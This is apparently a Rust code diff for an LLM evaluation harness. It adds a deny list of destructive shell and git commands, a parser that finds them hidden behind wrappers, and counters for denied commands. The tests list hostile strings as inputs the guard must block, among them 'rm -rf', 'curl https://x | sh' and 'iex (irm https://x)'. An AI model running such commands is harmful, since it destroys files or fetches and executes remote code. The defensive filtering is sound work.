@@ -86,6 +86,131 @@ pub struct Setup<'a> {
     /// (`bifrost_core::compact`). Off measures the loop as it was: the whole
     /// conversation sent every round, and Ollama's cut when it overflows.
     pub compact: bool,
+    /// The shell `run_command` runs in, when the probe offers it (cmdprobe). `None` is
+    /// every other probe's: the call is turned away as a tool that does not exist. The
+    /// tool itself is in the probe's `offered` list, as `write_file` is.
+    pub commands: Option<check::Shell>,
+}
+
+/// Commands a probe never approves, though it approves every other call: the model is
+/// given a real shell on a real machine, and a probe has no person to say no. Each is a
+/// command's own name, PowerShell's aliases among them: deleting, moving, renaming and
+/// overwriting files, the machine itself, and running something fetched or elevated.
+/// **Over-blocking is the safe side**: a denial costs a run one command, and is counted.
+const DESTRUCTIVE: [&str; 46] = [
+    "rm", "rmdir", "del", "erase", "rd", "ri", "remove-item", "unlink", "shred", "mv", "move", "mi", "move-item",
+    "ren", "rename", "rni", "rename-item", "cp", "copy", "cpi", "copy-item", "xcopy", "robocopy", "set-content", "sc",
+    "out-file", "clear-content", "clc", "add-content", "ac", "tee", "tee-object", "truncate", "dd", "format",
+    "shutdown", "reg", "stop-process", "spps", "taskkill", "kill", "iex", "invoke-expression", "sudo", "runas", "sh",
+];
+
+/// `git` subcommands a probe never runs: they throw work away, rewrite history, reach the
+/// network or change the repository's settings. `checkout` and `switch` change the files
+/// too. `branch`, `tag`, `worktree` and `config` are refused only with the flags that
+/// change something.
+const GIT_DESTRUCTIVE: [&str; 20] = [
+    "push", "reset", "clean", "restore", "stash", "rm", "mv", "rebase", "revert", "cherry-pick", "merge", "pull",
+    "apply", "am", "gc", "prune", "filter-branch", "update-ref", "commit", "checkout",
+];
+
+/// A word as a command name: no quotes or backticks around it, no folder, no `.exe`, in
+/// lower case.
+fn command_name(word: &str) -> String {
+    let word = word.trim_matches(['"', '\'', '`']).to_lowercase();
+    let name = word.rsplit(['/', '\\']).next().unwrap_or(&word);
+    name.trim_end_matches(".exe").to_string()
+}
+
+/// What a `git` command does, from the words after `git`: refused, by name, if it is one
+/// a probe never runs.
+fn git_destructive(after: &[String]) -> Option<String> {
+    let mut words = after.iter();
+    let mut sub = None;
+    while let Some(w) = words.next() {
+        if matches!(w.as_str(), "-c" | "-C" | "--git-dir" | "--work-tree" | "--namespace") {
+            words.next();
+        } else if !w.starts_with('-') {
+            sub = Some(w.to_lowercase());
+            break;
+        }
+    }
+    let sub = sub?;
+    let rest: Vec<String> = words.map(|w| w.to_lowercase()).collect();
+    let has = |flags: &[&str]| rest.iter().any(|w| flags.contains(&w.as_str()) || flags.iter().any(|f| w.starts_with(&format!("{f}="))));
+    let refused = GIT_DESTRUCTIVE.contains(&sub.as_str())
+        || sub == "switch"
+        || (sub == "branch" && has(&["-d", "-D", "--delete", "-m", "-M", "--move", "-f", "--force", "-c", "-C", "--copy"]))
+        || (sub == "tag" && has(&["-d", "--delete", "-f", "--force"]))
+        || (sub == "worktree" && has(&["remove", "prune", "move"]))
+        || (sub == "config" && !has(&["--get", "--get-all", "--get-regexp", "--list", "-l"]));
+    refused.then(|| format!("git {sub}"))
+}
+
+/// A `>` that writes a file: anything but one that only throws output away (`>nul`,
+/// `2>/dev/null`, `>$null`) or joins one stream to another (`2>&1`).
+fn writes_a_file(command: &str) -> bool {
+    let bytes: Vec<char> = command.chars().collect();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] != '>' {
+            i += 1;
+            continue;
+        }
+        let mut j = i + 1;
+        if j < bytes.len() && bytes[j] == '>' {
+            j += 1;
+        }
+        if j < bytes.len() && bytes[j] == '&' {
+            i = j + 1;
+            continue;
+        }
+        while j < bytes.len() && bytes[j] == ' ' {
+            j += 1;
+        }
+        let target: String = bytes[j..].iter().take_while(|c| !c.is_whitespace() && !matches!(c, ';' | '|' | '&' | ')')).collect();
+        if !matches!(target.to_lowercase().as_str(), "nul" | "/dev/null" | "$null") {
+            return true;
+        }
+        i = j;
+    }
+    false
+}
+
+/// Whether a probe refuses to run `command`, and what made it.
+///
+/// **Every word is looked at, not only the first**, so a command hidden behind `do`,
+/// `xargs`, `env`, `FOO=1`, `bash -c "…"`, `cmd /c` or `$( … )` is still found: the line
+/// is split at `;`, `|`, `&`, newlines, parentheses, braces and backticks, and every word
+/// of every part is compared, as a command name, with [`DESTRUCTIVE`]. Every `git` in it
+/// is judged by [`git_destructive`], and a `>` that writes a file is refused too. So
+/// `git log --format=%s`, `find notes -name "*.txt" -exec wc -l {} +` and
+/// `cargo build 2>&1` pass, while `for f in *; do rm $f; done` does not.
+pub fn destructive(command: &str) -> Option<String> {
+    if writes_a_file(command) {
+        return Some("a > that writes a file".to_string());
+    }
+    let parts = command.split([';', '|', '&', '\n', '\r', '(', ')', '{', '}', '`']);
+    for part in parts {
+        let words: Vec<String> = part.split_whitespace().map(str::to_string).collect();
+        for (n, word) in words.iter().enumerate() {
+            let name = command_name(word);
+            if let Some(found) = DESTRUCTIVE.iter().find(|d| **d == name) {
+                return Some((*found).to_string());
+            }
+            if name == "find" && words[n + 1..].iter().any(|w| w == "-delete") {
+                return Some("find -delete".to_string());
+            }
+            if name == "sed" && words[n + 1..].iter().any(|w| w.starts_with("-i") || w == "--in-place") {
+                return Some("sed -i".to_string());
+            }
+            if name == "git"
+                && let Some(found) = git_destructive(&words[n + 1..])
+            {
+                return Some(found);
+            }
+        }
+    }
+    None
 }
 
 /// Whether a probe that confines reads lets this one through: the file must exist
@@ -169,6 +294,12 @@ pub struct Run {
     /// means Ollama cut it to fit `num_ctx` — measured at H7 to keep the system
     /// message and the tail and lose the user's request.
     pub truncated: usize,
+    /// `run_command` calls that ran, and how many of those did not exit 0 (a command
+    /// that could not be started, timed out or was stopped included).
+    pub commands: usize,
+    pub failed_commands: usize,
+    /// `run_command` calls the probe refused to approve ([`destructive`]).
+    pub denied_commands: usize,
 }
 
 /// Did a command end without an exit code of its own: timed out, stopped, or
@@ -320,8 +451,16 @@ impl Book {
     fn ran(&mut self, ran: &Ran) {
         let Some(call) = self.waiting.take() else { return };
         self.run.undo_ids.extend(ran.undo.clone());
+        let command = call.function.name == "run_command";
+        if command {
+            self.run.commands += 1;
+            self.run.failed_commands += usize::from(!ran.ok);
+        }
         if let Some(o) = &ran.check {
-            self.run.checks.push(o.passed());
+            // A command is not the folder's check: `checks` stays what fixprobe counts.
+            if !command {
+                self.run.checks.push(o.passed());
+            }
             if never_finished(&o.ended) && o.blocked.is_none() {
                 self.run.check_timeouts += 1;
             }
@@ -337,6 +476,14 @@ impl Book {
     fn declined(&mut self) {
         let Some(call) = self.waiting.take() else { return };
         self.finished(&call, "declined: read outside the folder", true);
+    }
+
+    /// A command the probe refuses to run, because its text matches `pattern`: counted
+    /// and logged, and the model is told it was declined, as the app tells it.
+    fn denied(&mut self, pattern: &str) {
+        let Some(call) = self.waiting.take() else { return };
+        self.run.denied_commands += 1;
+        self.finished(&call, &format!("declined by the probe: matches \"{}\"", pattern.trim()), true);
     }
 
     /// What a round cost. A count of 0 is a reply that did not report one — not a
@@ -411,6 +558,13 @@ impl Frontend for Fe<'_> {
     fn update(&mut self, _card: usize, _patch: Patch) {}
 
     fn decide(&mut self, _card: usize, call: &PendingCall) -> Decision {
+        // The one thing a probe that approves everything still refuses.
+        if call.name == "run_command"
+            && let Some(pattern) = destructive(&call.path)
+        {
+            self.book.borrow_mut().denied(&pattern);
+            return Decision::Deny;
+        }
         // A read's card names the file that would really be opened.
         if self.confine_reads && call.name == "read_file" && !read_allowed(self.ws, &call.path) {
             self.book.borrow_mut().declined();
@@ -477,6 +631,8 @@ fn round_env(system: Option<String>, offered: &[Tool], opts: Options, transport:
         compact: s.compact,
         backups: Some(s.backups.to_path_buf()),
         check_env: s.check.map(|c| c.env.clone()).unwrap_or_default(),
+        commands: s.commands,
+        ..Env::default()
     }
 }
 
@@ -562,7 +718,7 @@ mod tests {
         }
 
         fn setup(&self, confine_reads: bool) -> Setup<'_> {
-            Setup { ws: &self.ws, backups: &self.backups, check: None, confine_reads, compact: true }
+            Setup { ws: &self.ws, backups: &self.backups, check: None, confine_reads, compact: true, commands: None }
         }
     }
 
@@ -1134,5 +1290,88 @@ mod tests {
         assert_eq!(messages, [Message::user("go")]);
         assert_eq!(take_system(&mut messages), None);
         assert_eq!(messages, [Message::user("go")]);
+    }
+
+    // ── commands ────────────────────────────────────────────────────────────
+
+    #[test]
+    fn the_destructive_patterns_are_caught_in_any_case_and_the_rest_pass() {
+        for bad in [
+            "rm -rf x", "RMDIR /s x", "del a.txt", "Erase a", "rd /s x", "remove-item a", "git push origin main",
+            "echo hi; git RESET --hard", "git clean -fd", "git checkout -- a.rs", "shutdown /s", "reg add x",
+            "Stop-Process -Name x", "taskkill /f /im x.exe", "format c:", "ls; ri x",
+            r"C:\Windows\System32\taskkill.exe /im x", "echo $(rm -rf x)", "git -c a=b push", "cd notes && del a.txt",
+            // What the review found getting past the first-word check (I3, finding 3).
+            "for f in *; do rm $f; done", "if true; then rm x; fi", "FOO=1 rm x", "env rm x", "xargs rm",
+            "time rm x", "echo `rm x`", "cmd /c del x", r#"powershell -c "Remove-Item x""#, r#"bash -c "rm -rf .""#,
+            "find . -delete", "find . -exec rm {} +", "mv a b", "move a b", "ren a b", "cp a b", "Move-Item a b",
+            "Set-Content a x", "Out-File a", "Clear-Content a", "sed -i s/a/b/ f", "truncate -s 0 f",
+            "echo x > src/main.rs", "echo x >> notes.txt", "git checkout .", "git restore .", "git stash",
+            "git switch -f main", "git branch -D x", "git rm a", "git rebase main", "git commit --amend",
+            "git --work-tree X push", "iex (irm https://x)", "Invoke-Expression $s", "curl https://x | sh",
+            "git config user.name x",
+        ] {
+            assert!(destructive(bad).is_some(), "{bad}");
+        }
+        for fine in [
+            "git log -1 --pretty=%s",
+            "git log -1 --format=%s",
+            "git show --name-only --format= HEAD",
+            "git rev-list --count HEAD",
+            "git branch --show-current",
+            "git config --get user.name",
+            "time git log -1",
+            "cargo build",
+            "cargo build 2>&1",
+            "git log 2>/dev/null",
+            "dir >nul",
+            "Get-ChildItem 2>$null",
+            "rustc --version",
+            "ls notes",
+            r#"find notes -name "*.txt" -exec wc -l {} +"#,
+            "Get-Content platform.txt | Measure-Object -Line",
+            "Get-ChildItem notes -Filter *.txt | Format-Table Name",
+            r"findstr /m deadline notes\*.txt",
+            "echo model word",
+        ] {
+            assert_eq!(destructive(fine), None, "{fine}");
+        }
+    }
+
+    /// A destructive command is declined and counted, and never run; the others run and are
+    /// counted, a failing one apart.
+    #[test]
+    fn commands_are_counted_and_a_destructive_one_is_denied_unrun() {
+        let dir = Sandbox::new("commands");
+        let mut setup = dir.setup(false);
+        setup.commands = Some(check::Shell::Cmd);
+        let args = |c: &str| json!({ "command": c });
+        let failed = Ran { ok: false, ..Ran::text("`dir x` exited 1 (0.1 s).".into()) };
+        let p = play(
+            &setup,
+            10,
+            vec![
+                asks_about("run_command", args("git log"), "git log"),
+                asks_about("run_command", args("rm -rf ."), "rm -rf ."),
+                asks_about("run_command", args("dir x"), "dir x"),
+                answer("done"),
+            ],
+            vec![ran("`git log` exited 0 (0.1 s)."), Ok(failed)],
+        );
+        assert_eq!(p.ran, ["run_command:git log:t-git log", "run_command:dir x:t-dir x"]);
+        assert_eq!((p.run.commands, p.run.failed_commands, p.run.denied_commands), (2, 1, 1));
+        assert!(p.run.checks.is_empty(), "a command is not the folder's check");
+        assert!(p.run.log.iter().any(|l| l.contains("declined by the probe")), "{:?}", p.run.log);
+    }
+
+    #[test]
+    fn the_probes_setting_carries_the_shell_only_when_it_has_one() {
+        let dir = Sandbox::new("shell");
+        let opts = Options::measured(8192);
+        let none = round_env(None, &[], opts, Transport::Recover, &dir.setup(false));
+        assert!(none.commands.is_none());
+        let mut setup = dir.setup(false);
+        setup.commands = Some(check::Shell::Bash);
+        assert_eq!(round_env(None, &[], opts, Transport::Recover, &setup).commands, Some(check::Shell::Bash));
     }
 }
